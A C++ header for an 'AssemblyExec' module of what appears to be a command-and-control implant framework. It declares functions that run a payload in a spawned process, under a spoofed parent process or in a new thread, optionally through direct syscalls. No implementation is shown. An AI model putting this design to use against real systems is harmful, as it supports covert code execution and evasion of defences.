#pragma once

#include "ModuleCmd.hpp"

#ifdef _WIN32
	#include <Windows.h>
#endif


class AssemblyExec : public ModuleCmd
{

public:
	AssemblyExec();
	~AssemblyExec();

	std::string getInfo();

	int init(std::vector<std::string>& splitedCmd, C2Message& c2Message);
	int initConfig(const nlohmann::json &config);
	int process(C2Message& c2Message, C2Message& c2RetMessage);

	int setProcessToSpawn(const std::string& processToSpawn)
	{
		m_processToSpawn = processToSpawn;
		return 0;
	}
	int setUseSyscall(bool useSyscall)
	{
		m_useSyscall = useSyscall;
		return 0;
	}
	int setModeProcess(bool isModeProcess)
	{
		m_isModeProcess = isModeProcess;
		return 0;
	}
	int setModeSpoofParent(bool isSpoofParent)
	{
		m_isSpoofParent = isSpoofParent;
		return 0;
	}
	int setSpoofedParent(const std::string& spoofedParent)
	{
		m_spoofedParent = spoofedParent;
		return 0;
	}

private:
	std::string m_processToSpawn;
	bool m_useSyscall;
	bool m_isModeProcess;
	bool m_isSpoofParent;
	std::string m_spoofedParent;

#ifdef __linux__
	int whateverLinux(std::string& result);
#elif _WIN32
	int createNewProcess(const std::string& payload, const std::string& processToSpawn, std::string& result);
	int createNewProcessWithSpoofedParent(const std::string& payload, const std::string& processToSpawn, const std::string& spoofedParent, std::string& result);
	int createNewThread(const std::string& payload, std::string& result);

	bool m_isProcessRuning;
	HANDLE m_processHandle;
	int killProcess();
#endif
};

#ifdef _WIN32

extern "C" __declspec(dllexport) AssemblyExec * A_AssemblyExecConstructor();

#else

extern "C"  __attribute__((visibility("default"))) AssemblyExec * AssemblyExecConstructor();

#endif

